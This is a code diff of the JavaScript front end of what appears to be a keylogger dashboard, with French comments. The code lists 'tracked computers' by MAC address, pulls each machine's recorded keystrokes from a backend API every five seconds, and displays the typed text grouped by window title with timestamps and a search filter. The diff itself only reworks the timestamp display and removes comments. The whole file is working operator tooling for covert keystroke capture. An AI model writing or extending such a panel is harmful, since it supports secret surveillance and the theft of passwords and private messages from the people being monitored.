@@ -6,13 +6,10 @@ document.addEventListener("DOMContentLoaded", function () {
     const mainMessage = document.getElementById("main-message"); // Message par défaut
     const recordingStatus = document.getElementById("recordingStatus"); // Indicateur d'enregistrement
 
-    // Récupérer la liste des machines enregistrées
     async function fetchComputers() {
         try {
-            const response = await fetch('/api/get_users'); // Correction de l'URL
+            const response = await fetch('/api/get_users');
             const data = await response.json();
-
-            // Réinitialise la liste et ajoute l'option par défaut
             computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';
 
             data.forEach(mac => {
@@ -26,13 +23,12 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // Récupérer les frappes enregistrées pour la machine sélectionnée
     async function fetchData() {
         const selectedMac = computerSelect.value;
         if (!selectedMac) return;
 
         try {
-            const response = await fetch(`/api/get_data/${selectedMac}`); // Correction de l'URL
+            const response = await fetch(`/api/get_data/${selectedMac}`);
             const data = await response.json();
 
             console.log("Données récupérées :", data);
@@ -48,35 +44,41 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // Afficher les logs dans l'interface
     function displayContent(content) {
         logContent.innerHTML = "";
 
         let lastWindow = null;
+        let lastTimestamp = null;
 
         content.forEach(entry => {
             const { window_mame, timestamp, data } = entry;
 
-            // Convertir timestamp en date + heure lisible
             const dateObj = new Date(timestamp);
-            const dateFormatted = dateObj.toLocaleDateString(); // Format: JJ/MM/AAAA
-            const timeFormatted = dateObj.toLocaleTimeString(); // Format: HH:MM:SS
+            const dateFormatted = dateObj.toLocaleDateString(); // JJ/MM/AAAA
+            const timeFormatted = dateObj.toLocaleTimeString(); // HH:MM:SS
 
-            // Si la fenêtre a changé, on affiche un nouveau bloc
+            const fullTimestamp = `${dateFormatted} - ${timeFormatted}`;
+
+            // Si la fenêtre a changé, on affiche un nouveau titre
             if (window_mame !== lastWindow) {
                 const windowTitle = document.createElement("h3");
                 windowTitle.textContent = window_mame;
                 windowTitle.style.fontWeight = "bold";
                 windowTitle.style.marginTop = "10px";
+                windowTitle.style.marginBottom = "5px"; // Espace de 5px max avant le timestamp
                 logContent.appendChild(windowTitle);
+
+                // On affiche le timestamp immédiatement
                 lastWindow = window_mame;
+                lastTimestamp = dateObj;
+                appendTimestamp(fullTimestamp);
             }
 
-            // Afficher la date + heure en gras
-            const timeElement = document.createElement("p");
-            timeElement.innerHTML = `<strong>${dateFormatted} - ${timeFormatted}</strong>`;
-
-            logContent.appendChild(timeElement);
+            // Afficher le timestamp toutes les 2 minutes si on reste dans la même fenêtre
+            if (!lastTimestamp || (dateObj - lastTimestamp) >= 120000) {
+                appendTimestamp(fullTimestamp);
+                lastTimestamp = dateObj;
+            }
 
             // Afficher le texte tapé
             const dataElement = document.createElement("p");
@@ -92,18 +94,24 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // Filtrer les frappes en fonction de la recherche utilisateur
+    function appendTimestamp(timestampText) {
+        const timeElement = document.createElement("p");
+        timeElement.innerHTML = `<strong>${timestampText}</strong>`;
+        timeElement.style.fontSize = "11px"; // Taille réduite à 11px
+        timeElement.style.fontWeight = "bold";
+        timeElement.style.marginBottom = "5px"; // Espace entre timestamp et logs
+        logContent.appendChild(timeElement);
+    }
+
     function searchContent(query) {
         if (!query) return displayContent(logData);
         const filtered = logData.filter(entry => JSON.stringify(entry).includes(query));
         displayContent(filtered);
     }
 
-    // Lancer la récupération des données toutes les 5 secondes
     fetchComputers();
     setInterval(fetchData, 5000);
 
-    // Gérer le changement de sélection d'un ordinateur
     computerSelect.addEventListener("change", function () {
         if (computerSelect.value) {
             mainMessage.style.display = "none";
